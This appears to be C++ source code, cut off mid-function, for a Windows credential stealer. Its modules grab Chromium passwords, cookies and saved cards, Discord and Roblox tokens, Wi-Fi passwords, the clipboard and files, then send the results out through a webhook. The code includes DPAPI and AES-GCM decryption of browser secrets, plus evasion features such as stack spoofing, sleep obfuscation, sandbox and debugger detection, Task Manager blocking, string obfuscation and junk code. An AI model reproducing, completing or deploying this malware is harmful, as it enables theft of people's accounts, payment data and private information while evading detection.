    NTSTATUS NtQuerySystemInformation(ULONG SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
    NTSTATUS NtWaitForSingleObject(HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout);
    void SleepMs(DWORD milliseconds);
}

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <winsock2.h>
#include <windows.h>
namespace StackSpoof {
    bool Init();
    LPVOID GetTrampoline();
    void SetTarget(LPVOID func);

    inline volatile LONG g_spoofLock = 0;
    static __forceinline void AcquireLock() {
        while (InterlockedCompareExchange(&g_spoofLock, 1, 0) != 0) {
            YieldProcessor();
        }
    }
    static __forceinline void ReleaseLock() {
        InterlockedExchange(&g_spoofLock, 0);
    }

#ifdef _WIN64
    template<typename Ret, typename Fn, typename... Args>
    static __forceinline Ret Call(Fn func, Args... args) {
        AcquireLock();
        SetTarget((LPVOID)func);
        Ret result = ((Ret(__cdecl*)(Args...))GetTrampoline())(args...);
        ReleaseLock();
        return result;
    }
    template<typename Fn, typename... Args>
    static __forceinline void CallVoid(Fn func, Args... args) {
        AcquireLock();
        SetTarget((LPVOID)func);
        ((void(__cdecl*)(Args...))GetTrampoline())(args...);
        ReleaseLock();
    }
#else
    template<typename Ret, typename Fn, typename... Args>
    static __forceinline Ret Call(Fn func, Args... args) {
        return ((Ret(__stdcall*)(Args...))func)(args...);
    }
    template<typename Fn, typename... Args>
    static __forceinline void CallVoid(Fn func, Args... args) {
        ((void(__stdcall*)(Args...))func)(args...);
    }
#endif
}

#pragma once
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <winsock2.h>
#include <windows.h>
namespace SleepObf {
    bool Init();
    void ObfuscatedSleep(DWORD milliseconds);
}

namespace Internal {
    bool Initialize();
    extern Resolver::LoadLibraryA_t _LoadLibraryA;
    extern Resolver::GetProcAddress_t _GetProcAddress;
    extern Resolver::MultiByteToWideChar_t _MultiByteToWideChar;
    extern Resolver::GetSystemInfo_t _GetSystemInfo;
    extern Resolver::VirtualProtect_t _VirtualProtect;
    extern Resolver::VirtualAlloc_t _VirtualAlloc;
    extern Resolver::VirtualFree_t _VirtualFree;
    extern Resolver::GetModuleHandleA_t _GetModuleHandleA;
    extern Resolver::GetComputerNameA_t _GetComputerNameA;
    extern Resolver::GetSystemDirectoryA_t _GetSystemDirectoryA;
    extern Resolver::GetDiskFreeSpaceExA_t _GetDiskFreeSpaceExA;
    extern Resolver::GlobalMemoryStatusEx_t _GlobalMemoryStatusEx;
    extern Resolver::GetCurrentProcessId_t _GetCurrentProcessId;
    extern Resolver::GetCurrentThreadId_t _GetCurrentThreadId;
    extern Resolver::SetProcessWorkingSetSize_t _SetProcessWorkingSetSize;
    extern Resolver::SetThreadExecutionState_t _SetThreadExecutionState;
    extern Resolver::GetTickCount_t _GetTickCount;
    extern Resolver::CreateMutexA_t _CreateMutexA;
    extern Resolver::GetLastError_t _GetLastError;
    extern Resolver::GetModuleFileNameA_t _GetModuleFileNameA;
    extern Resolver::FileTimeToSystemTime_t _FileTimeToSystemTime;
    extern Resolver::CreateFileA_t _CreateFileA;
    extern Resolver::GetFileTime_t _GetFileTime;
    extern Resolver::CloseHandle_t _CloseHandle;
    extern Resolver::GetProcessHeap_t _GetProcessHeap;
    extern Resolver::HeapAlloc_t _HeapAlloc;
    extern Resolver::HeapFree_t _HeapFree;
    extern Resolver::CreateFileMappingA_t _CreateFileMappingA;
    extern Resolver::MapViewOfFile_t _MapViewOfFile;
    extern Resolver::UnmapViewOfFile_t _UnmapViewOfFile;
    extern Resolver::GetUserNameA_t _GetUserNameA;
    extern Resolver::RegCreateKeyExA_t _RegCreateKeyExA;
    extern Resolver::RegSetValueExA_t _RegSetValueExA;
    extern Resolver::RegOpenKeyExA_t _RegOpenKeyExA;
    extern Resolver::RegQueryValueExA_t _RegQueryValueExA;
    extern Resolver::RegCloseKey_t _RegCloseKey;
    extern Resolver::OpenProcessToken_t _OpenProcessToken;
    extern Resolver::GetTokenInformation_t _GetTokenInformation;
    extern Resolver::GetForegroundWindow_t _GetForegroundWindow;
    extern Resolver::GetWindowTextA_t _GetWindowTextA;
    extern Resolver::GetLastInputInfo_t _GetLastInputInfo;
    extern Resolver::EnumDisplayDevicesA_t _EnumDisplayDevicesA;
    extern Resolver::WSAStartup_t _WSAStartup;
    extern Resolver::WSACleanup_t _WSACleanup;
    extern Resolver::socket_t _socket;
    extern Resolver::connect_t _connect;
    extern Resolver::send_t _send;
    extern Resolver::recv_t _recv;
    extern Resolver::closesocket_t _closesocket;
    extern Resolver::getaddrinfo_t _getaddrinfo;
    extern Resolver::freeaddrinfo_t _freeaddrinfo;
    extern Resolver::setsockopt_t _setsockopt;
    extern Resolver::InternetOpenA_t _InternetOpenA;
    extern Resolver::InternetOpenUrlA_t _InternetOpenUrlA;
    extern Resolver::InternetReadFile_t _InternetReadFile;
    extern Resolver::InternetCloseHandle_t _InternetCloseHandle;
    extern Resolver::CryptStringToBinaryA_t _CryptStringToBinaryA;
    extern Resolver::BCryptOpenAlgorithmProvider_t _BCryptOpenAlgorithmProvider;
    extern Resolver::BCryptGetProperty_t _BCryptGetProperty;
    extern Resolver::BCryptCreateHash_t _BCryptCreateHash;
    extern Resolver::BCryptHashData_t _BCryptHashData;
    extern Resolver::BCryptFinishHash_t _BCryptFinishHash;
    extern Resolver::BCryptDestroyHash_t _BCryptDestroyHash;
    extern Resolver::BCryptCloseAlgorithmProvider_t _BCryptCloseAlgorithmProvider;
    extern Resolver::BCryptGenRandom_t _BCryptGenRandom;
    extern Resolver::BCryptSetProperty_t _BCryptSetProperty;
    extern Resolver::BCryptGenerateSymmetricKey_t _BCryptGenerateSymmetricKey;
    extern Resolver::BCryptEncrypt_t _BCryptEncrypt;
    extern Resolver::BCryptDecrypt_t _BCryptDecrypt;
    extern Resolver::BCryptDestroyKey_t _BCryptDestroyKey;
    extern Resolver::CoInitializeEx_t _CoInitializeEx;
    extern Resolver::CoInitializeSecurity_t _CoInitializeSecurity;
    extern Resolver::CoCreateInstance_t _CoCreateInstance;
    extern Resolver::CoUninitialize_t _CoUninitialize;
    extern Resolver::VariantClear_t _VariantClear;
    extern Resolver::capGetDriverDescriptionA_t _capGetDriverDescriptionA;
    extern Resolver::IsUserAnAdmin_t _IsUserAnAdmin;
    NTSTATUS NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
    NTSTATUS NtProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect);
    NTSTATUS NtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);
    NTSTATUS NtFreeVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG FreeType);
    NTSTATUS NtClose(HANDLE Handle);
    NTSTATUS NtQueryInformationProcess(HANDLE ProcessHandle, ULONG ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);
    NTSTATUS NtSetInformationThread(HANDLE ThreadHandle, ULONG ThreadInformationClass, PVOID ThreadInformation, ULONG ThreadInformationLength);
    NTSTATUS NtCreateThreadEx(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList);
    NTSTATUS NtDelayExecution(BOOLEAN Alertable, LONGLONG* DelayInterval);
    NTSTATUS NtReadVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToRead, PSIZE_T NumberOfBytesRead);
    NTSTATUS NtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, PVOID ClientId);
    NTSTATUS NtQuerySystemInformation(ULONG SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
    NTSTATUS NtWaitForSingleObject(HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout);
    void SleepMs(DWORD milliseconds);

    inline DWORD SecureRand(DWORD maxVal) {
        if (maxVal == 0) return 0;
        DWORD val = 0;
        if (_BCryptGenRandom) {
            _BCryptGenRandom(NULL, (PUCHAR)&val, sizeof(val), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
        } else {

            unsigned __int64 tsc = __rdtsc();
            val = (DWORD)(tsc ^ (tsc >> 17));
#ifdef _WIN64
            val ^= (DWORD)__readgsqword(0x40);
#else
            val ^= (DWORD)__readfsdword(0x20);
#endif
        }
        return val % maxVal;
    }

    static __forceinline void SecureCopy(void* dst, const void* src, size_t len) {
        volatile unsigned char* d = (volatile unsigned char*)dst;
        const unsigned char* s = (const unsigned char*)src;
        for (size_t i = 0; i < len; i++) d[i] = s[i];
    }

    static __forceinline bool InlineStrEq(const char* a, const char* b) {
        while (*a && *b) {
            if (*a != *b) return false;
            a++; b++;
        }
        return *a == *b;
    }

    static __forceinline char InlineToUpper(char c) {
        return (c >= 'a' && c <= 'z') ? (c - 32) : c;
    }

    static __forceinline void IntToStr(int val, char* buf, int bufLen) {
        if (bufLen <= 0) return;
        if (val < 0) { *buf++ = '-'; bufLen--; val = -val; }
        char tmp[16]; int i = 0;
        do { tmp[i++] = '0' + (val % 10); val /= 10; } while (val && i < 15);
        for (int j = i - 1; j >= 0 && bufLen > 1; j--, bufLen--) *buf++ = tmp[j];
        *buf = 0;
    }

    static __forceinline void ByteToHex(unsigned char b, char* out) {
        const char hex[] = "0123456789abcdef";
        out[0] = hex[b >> 4];
        out[1] = hex[b & 0x0F];
    }
}

#pragma once
namespace Bypass {
    void ExecuteAll();
}

#include <string>
#include <windows.h>
namespace Modules {
    class AntiAnalysis {
    public:
        static bool IsSandbox();     
        static bool IsDebugger();    
        static bool SetMutex();      
        static void BlockTaskManager(bool block);
        static void HideFromScreenCapture();  
    };
}

#include <string>
#include <vector>
namespace Modules {
    struct SystemInfoData {
        std::string Hostname;
        std::string Username;
        std::string OS;           
        std::string CPU;
        std::string GPU;
        std::string RAM;
        std::string Disk;
        std::string Screen;       
        std::string HWID;         
        std::string PublicIP;
        std::string LocalIP;
        std::vector<std::string> RunningAV;  
    };
    class SystemInfo {
    public:
        static SystemInfoData Collect();
        static std::string Format(const SystemInfoData& d);
    };
}

#include <string>
#include <vector>
#include <windows.h>
namespace Modules {
    struct Account {
        std::string URL;
        std::string UserName;
        std::string Password;
        std::string Application;
        std::string Type;  
    };
    struct BrowserPaths {
        std::string name;
        std::string userDataPath;
        bool tryAppBound;  
    };
    class Chromium {
    public:
        static std::vector<Account> Grab();
    private:
        static std::vector<BrowserPaths> GetBrowserList();
        static std::vector<Account> GetPasswords(const BrowserPaths& b, const std::vector<BYTE>& masterKey, const std::vector<BYTE>& appBoundKey);
        static std::vector<Account> GetCookies(const BrowserPaths& b, const std::vector<BYTE>& masterKey, const std::vector<BYTE>& appBoundKey);
        static std::vector<Account> GetCards(const BrowserPaths& b, const std::vector<BYTE>& masterKey, const std::vector<BYTE>& appBoundKey);
        static std::vector<Account> GetHistory(const BrowserPaths& b);
        static std::vector<std::string> GetProfilePaths(const std::string& dataPath, const std::string& file);
        static std::string DecryptValue(const std::string& raw, const std::vector<BYTE>& masterKey, const std::vector<BYTE>& appBoundKey);
        static std::vector<BYTE> GetMasterKey(const std::string& localStateFolder, std::vector<BYTE>& appBoundKeyOut);
        static std::string PathJoin(const std::string& a, const std::string& b);
    };
}

#include <string>
namespace Modules {
    struct ClipboardData {
        std::string Content;
        std::string Type;  
    };
    class Clipboard {
    public:
        static ClipboardData Grab();
        static std::string Format(const ClipboardData& d);
    };
}

#include <string>
#include <vector>
namespace Modules {
    struct DiscordAccount {
        std::string Token;
        std::string Source;     
        std::string Username;
        std::string ID;
        std::string Email;
        std::string Phone;
        std::string Nitro;
        std::string MFA;
        std::string Billing;
        std::string Avatar;
        bool Valid = false;
    };
    class Discord {
    public:
        static std::vector<DiscordAccount> Grab();
        static std::string Format(const std::vector<DiscordAccount>& data);
    private:
        static std::vector<std::string> ExtractFromPath(const std::string& leveldbPath, const std::string& localStatePath);
        static std::string DecryptVaultToken(const std::string& b64, const std::string& localStatePath);
        static DiscordAccount FetchInfo(const std::string& token, const std::string& source);
        static std::string ParseJson(const std::string& json, const std::string& key);
    };
}

#include <string>
#include <vector>
namespace Modules {
    class FileGrabber {
    public:
        static void Grab();
    private:
        static void ScanDirectory(std::string path);
    };
}

#include <string>
#include <vector>
namespace Modules {
    class Roblox {
    public:
        static std::vector<std::string> Grab();
    };
}

#include <string>
#include <vector>
namespace Modules {
    struct WiFiRecord {
        std::string SSID;
        std::string Password;
        std::string Auth;    
    };
    class WiFi {
    public:
        static std::vector<WiFiRecord> Grab();
        static std::string Format(const std::vector<WiFiRecord>& data);
    };
}

#include <string>
#include <windows.h>
namespace Modules {
    class Webhook {
    public:

        static bool InitSession();

        static void CloseSession();

        static bool SendFile(const std::string& url, const std::string& content, const std::string& fileName);
        static bool SendEmbed(const std::string& url, const std::string& jsonPayload);
        static bool SendFileRetry(const std::string& url, const std::string& content, const std::string& fileName, int maxRetries = 3);
        static std::string BuildSummaryEmbed(
            const std::string& hostname, const std::string& username,
            const std::string& os, const std::string& ip,
            int passwords, int cookies, int cards, int tokens,
            int wifi, bool clipboard
        );
    };
}

#include <vector>
#include <algorithm>
namespace Crypto {
    std::string DecryptDPAPI(const std::vector<BYTE>& data) {
        JUNK_CODE_SMALL
        if (data.empty()) { SLOG("[CRYPTO] DPAPI: empty input"); return ""; }
        if (!DynAPI::CryptUnprotData) { SLOG("[CRYPTO] DPAPI: CryptUnprotectData not resolved"); return ""; }
        DATA_BLOB in, out;
        in.pbData = const_cast<BYTE*>(data.data());
        in.cbData = (DWORD)data.size();
        if (DynAPI::CryptUnprotData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
            std::string result((char*)out.pbData, out.cbData);
            LocalFree(out.pbData);
            return result;
        }
        return "";
    }
    std::vector<BYTE> DecryptAES_GCM(const std::vector<BYTE>& key, const std::vector<BYTE>& iv, const std::vector<BYTE>& aad, const std::vector<BYTE>& ciphertext, const std::vector<BYTE>& tag) {
        JUNK_CODE_SMALL
        SLOG("[CRYPTO] AES-GCM decrypt: key=%zuB iv=%zuB ct=%zuB", key.size(), iv.size(), ciphertext.size());
        if (!Internal::_BCryptOpenAlgorithmProvider) { SLOG("[CRYPTO] BCrypt not available"); return {}; }
        BCRYPT_ALG_HANDLE hAlg = NULL;
        BCRYPT_KEY_HANDLE hKey = NULL;
        NTSTATUS status;
        status = Internal::_BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
        if (status != 0) return {};
        status = Internal::_BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
        if (status != 0) {
            Internal::_BCryptCloseAlgorithmProvider(hAlg, 0);
            return {};
        }
        status = Internal::_BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, const_cast<BYTE*>(key.data()), (ULONG)key.size(), 0);
        if (status != 0) {
            Internal::_BCryptCloseAlgorithmProvider(hAlg, 0);
            return {};
        }
        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
        memset(&authInfo, 0, sizeof(authInfo));
        authInfo.cbSize = sizeof(authInfo);
        authInfo.dwInfoVersion = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION;
        authInfo.pbNonce = const_cast<BYTE*>(iv.data());
        authInfo.cbNonce = (ULONG)iv.size();
        authInfo.pbTag = const_cast<BYTE*>(tag.data());
        authInfo.cbTag = (ULONG)tag.size();
        if (!aad.empty()) {
            authInfo.pbAuthData = const_cast<BYTE*>(aad.data());
            authInfo.cbAuthData = (ULONG)aad.size();
        }
        DWORD decryptedSize = 0;
        std::vector<BYTE> decrypted(ciphertext.size());
        status = Internal::_BCryptDecrypt(hKey, const_cast<BYTE*>(ciphertext.data()), (ULONG)ciphertext.size(), &authInfo, NULL, 0, decrypted.data(), (ULONG)decrypted.size(), &decryptedSize, 0);
        Internal::_BCryptDestroyKey(hKey);
        Internal::_BCryptCloseAlgorithmProvider(hAlg, 0);
        if (status != 0) return {};
        decrypted.resize(decryptedSize);
        return decrypted;
    }
    std::vector<BYTE> DecryptChaCha20Poly1305(const std::vector<BYTE>& key, const std::vector<BYTE>& iv, const std::vector<BYTE>& aad, const std::vector<BYTE>& ciphertext, const std::vector<BYTE>& tag) {
        JUNK_CODE_SMALL
        if (!Internal::_BCryptOpenAlgorithmProvider) return {};
        BCRYPT_ALG_HANDLE hAlg = NULL;
        BCRYPT_KEY_HANDLE hKey = NULL;
        NTSTATUS status;
        status = Internal::_BCryptOpenAlgorithmProvider(&hAlg, L"CHACHA20_POLY1305", NULL, 0);
        if (status != 0) return {};
        status = Internal::_BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, const_cast<BYTE*>(key.data()), (ULONG)key.size(), 0);
        if (status != 0) {
            Internal::_BCryptCloseAlgorithmProvider(hAlg, 0);
            return {};
        }
        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
        memset(&authInfo, 0, sizeof(authInfo));
        authInfo.cbSize = sizeof(authInfo);
        authInfo.dwInfoVersion = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION;
        authInfo.pbNonce = const_cast<BYTE*>(iv.data());
        authInfo.cbNonce = (ULONG)iv.size();
        authInfo.pbTag = const_cast<BYTE*>(tag.data());
        authInfo.cbTag = (ULONG)tag.size();
        if (!aad.empty()) {
            authInfo.pbAuthData = const_cast<BYTE*>(aad.data());
            authInfo.cbAuthData = (ULONG)aad.size();
        }
        DWORD decryptedSize = 0;
        std::vector<BYTE> decrypted(ciphertext.size());
        status = Internal::_BCryptDecrypt(hKey, const_cast<BYTE*>(ciphertext.data()), (ULONG)ciphertext.size(), &authInfo, NULL, 0, decrypted.data(), (ULONG)decrypted.size(), &decryptedSize, 0);
        Internal::_BCryptDestroyKey(hKey);
        Internal::_BCryptCloseAlgorithmProvider(hAlg, 0);
        if (status != 0) return {};
        decrypted.resize(decryptedSize);
        return decrypted;
    }
    std::vector<BYTE> Base64Decode(const std::string& input) {
        JUNK_CODE_SMALL
        if (!DynAPI::CryptStrBinaryA) return {};
        DWORD outLen = 0;
        if (DynAPI::CryptStrBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64, NULL, &outLen, NULL, NULL)) {
            std::vector<BYTE> result(outLen);
            if (DynAPI::CryptStrBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64, result.data(), &outLen, NULL, NULL)) {
                return result;
            }
        }
        return {};
    }
}

#include <winhttp.h>
#include <sstream>
namespace DynAPI {

    pWinHttpOpen            WHttpOpen      = nullptr;
    pWinHttpConnect         WHttpConnect   = nullptr;
    pWinHttpOpenRequest     WHttpOpenReq   = nullptr;
    pWinHttpSendRequest     WHttpSendReq   = nullptr;
    pWinHttpReceiveResponse WHttpRecvResp  = nullptr;
    pWinHttpQueryHeaders    WHttpQueryH    = nullptr;
    pWinHttpCloseHandle     WHttpCloseH    = nullptr;
    pWinHttpSetTimeouts     WHttpSetTime   = nullptr;
    pWinHttpQueryDataAvailable WHttpQueryAvail = nullptr;
    pWinHttpReadData        WHttpReadData  = nullptr;

    pCryptUnprotectData  CryptUnprotData  = nullptr;
    pCryptStringToBinaryA CryptStrBinaryA = nullptr;

    pSHGetFolderPathA SHGetFolderA = nullptr;
    pShellExecuteExA  ShellExecExA = nullptr;

    pRegCreateKeyExW  RegCreateKeyEx = nullptr;
    pRegSetValueExW   RegSetValueEx  = nullptr;
    pRegCloseKey      RegClose       = nullptr;
    pRegOpenKeyExW    RegOpenKeyEx   = nullptr;
    pRegQueryValueExW RegQueryValueEx= nullptr;

    pGlobalMemoryStatusEx    GlobalMemStatusEx  = nullptr;
    pGetComputerNameA        GetCompNameA       = nullptr;
    pGetUserNameA            GetUserNmA         = nullptr;
    pGetSystemInfo           GetSysInfo         = nullptr;
    pGetTickCount64          GetTickCount       = nullptr;
    pOpenProcess             OpenProc           = nullptr;
    pTerminateProcess        TermProc           = nullptr;
    pGetModuleFileNameA      GetModFileNameA    = nullptr;
    pCreateProcessA          CreateProcA        = nullptr;
    pCreateToolhelp32Snapshot CreateSnapshot    = nullptr;
    pProcess32First           Proc32First       = nullptr;
    pProcess32Next            Proc32Next        = nullptr;
    pCloseHandle              CloseH            = nullptr;

    pSetWindowDisplayAffinity SetWndDisplayAffinity = nullptr;
    pGetSystemMetrics   GetSysMetrics  = nullptr;
    pGetDesktopWindow   GetDesktopWnd  = nullptr;
    pGetWindowDC        GetWndDC       = nullptr;
    pReleaseDC          RelDC          = nullptr;
    pFindWindowA        FindWndA       = nullptr;

    pCreateCompatibleDC     CreateCompDC     = nullptr;
    pCreateCompatibleBitmap CreateCompBitmap = nullptr;
    pSelectObject           SelectObj        = nullptr;
    pBitBlt                 BitBlt_f         = nullptr;
    pDeleteDC               DelDC            = nullptr;
    pDeleteObject           DelObj           = nullptr;

    pWlanOpenHandle     WlanOpen       = nullptr;
    pWlanCloseHandle    WlanClose      = nullptr;
    pWlanEnumInterfaces WlanEnumIfaces = nullptr;
    pWlanGetProfileList WlanGetProfList= nullptr;
    pWlanGetProfile     WlanGetProf    = nullptr;
    pWlanFreeMemory     WlanFree       = nullptr;

    pNCryptOpenStorageProvider NCryptOpenStorage = nullptr;
    pNCryptOpenKey             NCryptOpenK       = nullptr;
    pNCryptDecrypt             NCryptDecr        = nullptr;
    pNCryptFreeObject          NCryptFreeObj     = nullptr;

    pOpenProcessToken          OpenProcToken     = nullptr;
    pLookupPrivilegeValueA     LookupPrivValueA  = nullptr;
    pAdjustTokenPrivileges     AdjustTokPrivs    = nullptr;
    pDuplicateTokenEx          DupTokenEx        = nullptr;
    pImpersonateLoggedOnUser   ImpersonateLoggedUser = nullptr;
    pRevertToSelf              RevertSelf        = nullptr;
    pSetThreadToken            SetThrToken       = nullptr;
    pGetTokenInformation       GetTokenInf       = nullptr;

    static FARPROC GPA(const char* dll, const char* func) {
        if (!Internal::_GetProcAddress || !Internal::_GetModuleHandleA) return nullptr;
        HMODULE hMod = Internal::_GetModuleHandleA(dll);
        if (!hMod && Internal::_LoadLibraryA) hMod = Internal::_LoadLibraryA(dll);
        if (!hMod) return nullptr;
        return Internal::_GetProcAddress(hMod, func);
    }

    std::string HttpGet(const std::wstring& host, const std::wstring& path, bool https) {
        if (!WHttpOpen) return "";
        HINTERNET hSess = WHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        if (!hSess) return "";
        WHttpSetTime(hSess, 5000, 5000, 5000, 5000);
        INTERNET_PORT port = https ? INTERNET_DEFAULT_HTTPS_PORT : INTERNET_DEFAULT_HTTP_PORT;
        HINTERNET hConn = WHttpConnect(hSess, host.c_str(), port, 0);
        if (!hConn) { WHttpCloseH(hSess); return ""; }
        DWORD flags = https ? WINHTTP_FLAG_SECURE : 0;
        HINTERNET hReq = WHttpOpenReq(hConn, L"GET", path.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
        if (!hReq) { WHttpCloseH(hConn); WHttpCloseH(hSess); return ""; }
        WHttpSendReq(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
        WHttpRecvResp(hReq, NULL);
        std::string resp;
        DWORD avail = 0;
        while (WHttpQueryAvail && WHttpQueryAvail(hReq, &avail) && avail > 0) {
            std::vector<char> buf(avail + 1, 0);
            DWORD read = 0;
            if (WHttpReadData(hReq, buf.data(), avail, &read)) resp.append(buf.data(), read);
        }
        WHttpCloseH(hReq); WHttpCloseH(hConn); WHttpCloseH(hSess);
        return resp;
    }

    bool Initialize() {
        SLOG("[DYNAPI] Initialize() started");

        if (!Internal::_LoadLibraryA || !Internal::_GetProcAddress) {
            SLOG("[DYNAPI] FAILED: Internal core APIs not available");
            return false;
        }

        JUNK_CODE_LARGE

        Internal::_LoadLibraryA(OBFS_S("crypt32.dll").c_str());
        Internal::_LoadLibraryA(OBFS_S("winhttp.dll").c_str());
        Internal::_LoadLibraryA(OBFS_S("shell32.dll").c_str());
        Internal::_LoadLibraryA(OBFS_S("user32.dll").c_str());
        Internal::_LoadLibraryA(OBFS_S("gdi32.dll").c_str());
        Internal::_LoadLibraryA(OBFS_S("wlanapi.dll").c_str());
        Internal::_LoadLibraryA(OBFS_S("ncrypt.dll").c_str());

        CryptUnprotData  = (pCryptUnprotectData)  GPA(OBFS_S("crypt32.dll").c_str(), OBFS_S("CryptUnprotectData").c_str());
        CryptStrBinaryA  = (pCryptStringToBinaryA)GPA(OBFS_S("crypt32.dll").c_str(), OBFS_S("CryptStringToBinaryA").c_str());
        JUNK_CODE_SMALL

        WHttpOpen       = (pWinHttpOpen)              GPA(OBFS_S("winhttp.dll").c_str(), OBFS_S("WinHttpOpen").c_str());
        WHttpConnect    = (pWinHttpConnect)           GPA(OBFS_S("winhttp.dll").c_str(), OBFS_S("WinHttpConnect").c_str());
        WHttpOpenReq    = (pWinHttpOpenRequest)       GPA(OBFS_S("winhttp.dll").c_str(), OBFS_S("WinHttpOpenRequest").c_str());
        WHttpSendReq    = (pWinHttpSendRequest)       GPA(OBFS_S("winhttp.dll").c_str(), OBFS_S("WinHttpSendRequest").c_str());
        WHttpRecvResp   = (pWinHttpReceiveResponse)   GPA(OBFS_S("winhttp.dll").c_str(), OBFS_S("WinHttpReceiveResponse").c_str());
        WHttpQueryH     = (pWinHttpQueryHeaders)      GPA(OBFS_S("winhttp.dll").c_str(), OBFS_S("WinHttpQueryHeaders").c_str());
        WHttpCloseH     = (pWinHttpCloseHandle)       GPA(OBFS_S("winhttp.dll").c_str(), OBFS_S("WinHttpCloseHandle").c_str());
        WHttpSetTime    = (pWinHttpSetTimeouts)       GPA(OBFS_S("winhttp.dll").c_str(), OBFS_S("WinHttpSetTimeouts").c_str());
        WHttpQueryAvail = (pWinHttpQueryDataAvailable)GPA(OBFS_S("winhttp.dll").c_str(), OBFS_S("WinHttpQueryDataAvailable").c_str());
        WHttpReadData   = (pWinHttpReadData)          GPA(OBFS_S("winhttp.dll").c_str(), OBFS_S("WinHttpReadData").c_str());

        SHGetFolderA = (pSHGetFolderPathA)GPA(OBFS_S("shell32.dll").c_str(), OBFS_S("SHGetFolderPathA").c_str());
        ShellExecExA = (pShellExecuteExA) GPA(OBFS_S("shell32.dll").c_str(), OBFS_S("ShellExecuteExA").c_str());

        RegCreateKeyEx  = (pRegCreateKeyExW) GPA(OBFS_S("advapi32.dll").c_str(), OBFS_S("RegCreateKeyExW").c_str());
        RegSetValueEx   = (pRegSetValueExW)  GPA(OBFS_S("advapi32.dll").c_str(), OBFS_S("RegSetValueExW").c_str());
        RegClose        = (pRegCloseKey)     GPA(OBFS_S("advapi32.dll").c_str(), OBFS_S("RegCloseKey").c_str());
        RegOpenKeyEx    = (pRegOpenKeyExW)   GPA(OBFS_S("advapi32.dll").c_str(), OBFS_S("RegOpenKeyExW").c_str());
        RegQueryValueEx = (pRegQueryValueExW)GPA(OBFS_S("advapi32.dll").c_str(), OBFS_S("RegQueryValueExW").c_str());
        GetUserNmA      = (pGetUserNameA)    GPA(OBFS_S("advapi32.dll").c_str(), OBFS_S("GetUserNameA").c_str());
        OpenProcToken   = (pOpenProcessToken)GPA(OBFS_S("advapi32.dll").c_str(), OBFS_S("OpenProcessToken").c_str());
        LookupPrivValueA = (pLookupPrivilegeValueA)GPA(OBFS_S("advapi32.dll").c_str(), OBFS_S("LookupPrivilegeValueA").c_str());
        AdjustTokPrivs  = (pAdjustTokenPrivileges)GPA(OBFS_S("advapi32.dll").c_str(), OBFS_S("AdjustTokenPrivileges").c_str());
        DupTokenEx      = (pDuplicateTokenEx)     GPA(OBFS_S("advapi32.dll").c_str(), OBFS_S("DuplicateTokenEx").c_str());
        ImpersonateLoggedUser = (pImpersonateLoggedOnUser)GPA(OBFS_S("advapi32.dll").c_str(), OBFS_S("ImpersonateLoggedOnUser").c_str());
        RevertSelf      = (pRevertToSelf)         GPA(OBFS_S("advapi32.dll").c_str(), OBFS_S("RevertToSelf").c_str());
        SetThrToken     = (pSetThreadToken)       GPA(OBFS_S("advapi32.dll").c_str(), OBFS_S("SetThreadToken").c_str());
        GetTokenInf     = (pGetTokenInformation)  GPA(OBFS_S("advapi32.dll").c_str(), OBFS_S("GetTokenInformation").c_str());
        JUNK_CODE_SMALL

        GlobalMemStatusEx  = (pGlobalMemoryStatusEx) GPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("GlobalMemoryStatusEx").c_str());
        GetCompNameA       = (pGetComputerNameA)     GPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("GetComputerNameA").c_str());
        GetSysInfo         = (pGetSystemInfo)        GPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("GetSystemInfo").c_str());
        GetTickCount       = (pGetTickCount64)       GPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("GetTickCount64").c_str());
        OpenProc           = (pOpenProcess)          GPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("OpenProcess").c_str());
